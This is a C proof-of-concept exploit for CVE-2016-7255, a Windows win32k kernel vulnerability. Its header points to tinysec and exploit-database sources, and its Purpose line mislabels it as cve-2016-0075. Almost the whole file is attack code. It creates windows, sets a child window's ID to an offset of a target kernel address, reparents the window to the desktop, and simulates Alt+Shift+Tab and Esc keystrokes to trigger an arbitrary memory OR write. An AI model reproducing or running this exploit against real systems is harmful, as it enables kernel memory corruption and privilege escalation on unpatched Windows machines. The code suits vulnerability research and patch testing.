/*
Source: https://github.com/tinysec/public/tree/master/CVE-2016-7255

Full Proof of Concept:

https://github.com/tinysec/public/tree/master/CVE-2016-7255
https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40745.zip

********************************************************************
 Created:	2016-11-09 14:23:09
 Filename: 	main.c
 Author:	root[at]TinySec.net
 Version	0.0.0.1
 Purpose:	poc of cve-2016-0075
*********************************************************************
*/

#include <windows.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdio.h>


//////////////////////////////////////////////////////////////////////////
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"user32.lib")

#undef DbgPrint
ULONG __cdecl DbgPrintEx( IN ULONG ComponentId, IN ULONG Level, IN PCCH Format, IN ... );
ULONG __cdecl DbgPrint(__in char* Format, ...)
{
	CHAR* pszDbgBuff = NULL;
	va_list VaList=NULL;
	ULONG ulRet = 0;
	
	do 
	{
		pszDbgBuff = (CHAR*)HeapAlloc(GetProcessHeap(), 0 ,1024 * sizeof(CHAR));
		if (NULL == pszDbgBuff)
		{
			break;
		}
		RtlZeroMemory(pszDbgBuff,1024 * sizeof(CHAR));
		
		va_start(VaList,Format);
		
		_vsnprintf((CHAR*)pszDbgBuff,1024 - 1,Format,VaList);
		
		DbgPrintEx(77 , 0 , pszDbgBuff );
		OutputDebugStringA(pszDbgBuff);
		
		va_end(VaList);
		
	} while (FALSE);
	
	if (NULL != pszDbgBuff)
	{
		HeapFree( GetProcessHeap(), 0 , pszDbgBuff );
		pszDbgBuff = NULL;
	}
	
	return ulRet;
}


 int _sim_key_down(WORD wKey)
 {
	 INPUT stInput = {0};
	 
	 do 
	 {
		 stInput.type = INPUT_KEYBOARD;
		 stInput.ki.wVk = wKey;
		 stInput.ki.dwFlags = 0;
		 
		 SendInput(1 , &stInput , sizeof(stInput) );

	 } while (FALSE);
	 
	 return 0;
}

 int _sim_key_up(WORD wKey)
 {
	 INPUT stInput = {0};
	 
	 do 
	 {
		 stInput.type = INPUT_KEYBOARD;
		 stInput.ki.wVk = wKey;
		 stInput.ki.dwFlags = KEYEVENTF_KEYUP;
		 
		 SendInput(1 , &stInput , sizeof(stInput) );
		 
	 } while (FALSE);
	 
	 return 0;
}

 int _sim_alt_shift_esc()
 {
	 int i = 0;
	 
	 do 
	 {
		 _sim_key_down( VK_MENU );
		 _sim_key_down( VK_SHIFT );	 
		 
		
		_sim_key_down( VK_ESCAPE);
		_sim_key_up( VK_ESCAPE);

		_sim_key_down( VK_ESCAPE);
		_sim_key_up( VK_ESCAPE);
			 
		 _sim_key_up( VK_MENU );
		 _sim_key_up( VK_SHIFT );	 	 
		 
		 
	 } while (FALSE);
	 
	 return 0;
}

 

 int _sim_alt_shift_tab(int nCount)
 {
	 int i = 0;
	 HWND hWnd = NULL;


	 int nFinalRet = -1;

	 do 
	 {
		 _sim_key_down( VK_MENU );
		 _sim_key_down( VK_SHIFT );	 


		 for ( i = 0; i < nCount ; i++)
		 {
			 _sim_key_down( VK_TAB);
			 _sim_key_up( VK_TAB);
			 
			 Sleep(1000);

		 }
	
		 
		_sim_key_up( VK_MENU );
		 _sim_key_up( VK_SHIFT );	 
	 } while (FALSE);
	 
	 return nFinalRet;
}



int or_address_value_4(__in void* pAddress)
{
	WNDCLASSEXW stWC = {0};

	HWND	hWndParent = NULL;
	HWND	hWndChild = NULL;

	WCHAR*	pszClassName = L"cve-2016-7255";
	WCHAR*	pszTitleName = L"cve-2016-7255";

	void*	pId = NULL;
	MSG		stMsg = {0};

	do 
	{

		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = pszClassName;
		
		if ( 0 == RegisterClassExW(&stWC) )
		{
			break;
		}

		hWndParent = CreateWindowExW(
			0,
			pszClassName,
			NULL,
			WS_OVERLAPPEDWINDOW|WS_VISIBLE,
			0,
			0,
			360,
			360,
			NULL,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndParent)
		{
			break;
		}

		hWndChild = CreateWindowExW(
			0,
			pszClassName,
			pszTitleName,
			WS_OVERLAPPEDWINDOW|WS_VISIBLE|WS_CHILD,
			0,
			0,
			160,
			160,
			hWndParent,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);
		
		if (NULL == hWndChild)
		{
			break;
		}

		#ifdef _WIN64
			pId = ( (UCHAR*)pAddress - 0x28 ); 
		#else
			pId = ( (UCHAR*)pAddress - 0x14); 
		#endif // #ifdef _WIN64
		
		SetWindowLongPtr(hWndChild , GWLP_ID , (LONG_PTR)pId );

		DbgPrint("hWndChild = 0x%p\n" , hWndChild);
		DebugBreak();

		ShowWindow(hWndParent , SW_SHOWNORMAL);

		SetParent(hWndChild , GetDesktopWindow() );

		SetForegroundWindow(hWndChild);

		_sim_alt_shift_tab(4);
		
		SwitchToThisWindow(hWndChild , TRUE);
		
		_sim_alt_shift_esc();


		while( GetMessage(&stMsg , NULL , 0 , 0) )
		{	
			TranslateMessage(&stMsg);
			DispatchMessage(&stMsg);
		}
	

	} while (FALSE);

	if ( NULL != hWndParent )
	{
		DestroyWindow(hWndParent);
		hWndParent = NULL;
	}

	if ( NULL != hWndChild )
	{
		DestroyWindow(hWndChild);
		hWndChild = NULL;
	}

	UnregisterClassW(pszClassName , GetModuleHandleW(NULL) );

	return 0;
}

int __cdecl wmain(int nArgc, WCHAR** Argv)
{
	do 
	{
		or_address_value_4( (void*)0xFFFFFFFF );
	} while (FALSE);
	
	return 0;
}